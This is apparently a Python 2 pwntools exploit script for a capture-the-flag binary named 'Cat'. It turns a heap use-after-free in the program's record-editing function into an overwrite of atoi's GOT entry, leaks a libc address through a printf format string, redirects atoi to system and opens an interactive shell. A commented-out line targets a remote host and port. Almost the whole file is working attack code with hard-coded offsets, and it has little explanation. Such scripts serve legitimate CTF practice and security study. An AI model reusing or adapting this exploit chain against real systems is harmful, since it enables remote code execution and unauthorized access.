#!/usr/bin/python

# Heap: Use-After-Free : in edit_record function if chose to not modify record - ptr not getting zeroed

# more detailed info in cat_notes.txt

from pwn import *

def create_record(p, name, kind, age, replaced_atoi):
    log.info('creating record ...')
    if (replaced_atoi):
        p.sendline('a\x00')
    else:
        p.sendline('1')
    p.recvuntil('> ')
    p.sendline(name)
    p.recvuntil('> ')
    p.sendline(kind)
    p.recvuntil('> ')
    if (replaced_atoi):
        p.sendline('a\x00')
    else:
        p.sendline(age)   
    print p.recvline()
    p.recvuntil('> ')

# to_modify: 'y' or 'n'
def edit_record(p, rec_id, name, kind, age, to_modify, replaced_atoi):
    log.info('editing ' + rec_id + 'th record ...')
    if (replaced_atoi):
        p.sendline('aa\x00')
    else:
        p.sendline('2')
    p.recvuntil('> ')
    if (replaced_atoi):      
        p.sendline('a' * int(rec_id) + '\x00')
    else:
        p.sendline(rec_id) 
    p.recvuntil('> ')
    p.sendline(name)
    p.recvuntil('> ')
    p.sendline(kind)
    p.recvuntil('> ')
    if (replaced_atoi):
        p.sendline('aa\x00')
    else:
        p.sendline(age)   
    p.recvuntil('> ')
    p.sendline(to_modify)
    print p.recvline()
    p.recvuntil('> ')


s = process('./Cat')
#s = remote('178.62.40.102', 6000)


# libc : 0x7ffff7a0d000
# system : 0x45390
# pets_table_addr = 0x6020a0

elf = ELF('./Cat')

atoi_got = elf.got['atoi']
printf_plt = elf.plt['printf']

log.info('atoi_got = ' + str(hex(atoi_got)))      # atoi_got = 0x602068
log.info('printf_plt = ' + str(hex(printf_plt)))  # read_plt = 0x4006f0

some_empty_heap_addr = 0x602300

s.recvuntil('> ')

# writing printf_plt at atoi_got
create_record(s, 'A', 'B', '1', False)
edit_record(s, '0', 'C', 'D', '1', 'n', False)
create_record(s, 'E', p64(atoi_got) + p64(some_empty_heap_addr), '1', False)
edit_record(s, '0', p64(printf_plt), 'FFFFFFFF', '1', 'y', False)

# leaking libc
s.sendline('%3$p')
leak = s.recvline()[:-25:]
# 0x7ffff7b04260 - 0x7ffff7a0d000 = 0xf7260
libc_addr = int(leak, 16) - 0xf7260 
log.info('libc_addr = ' + hex(libc_addr))

pause()

system_addr = libc_addr + 0x45390

# writing system_addr at atoi_got
create_record(s, 'a', 'b', '1', True)
edit_record(s, '2', 'c', 'd', '1', 'n', True)
create_record(s, 'e', p64(atoi_got) + p64(some_empty_heap_addr), '1', True)
edit_record(s, '1', p64(system_addr), 'ffffffff', '1', 'y', True)

s.sendline('sh')

s.interactive()


'''
# 0x401022 - main
# 0x4008b8 - print_menu
# 0x400996 - create_record
# 0x400b74 - edit_record

gdb.attach(s, """
b * 0x4008b8
b * 0x400b74
b * 0x400c72
heapinfoall
x/32gx 0x603000
x/32gx 0x6020a0
""")
'''

























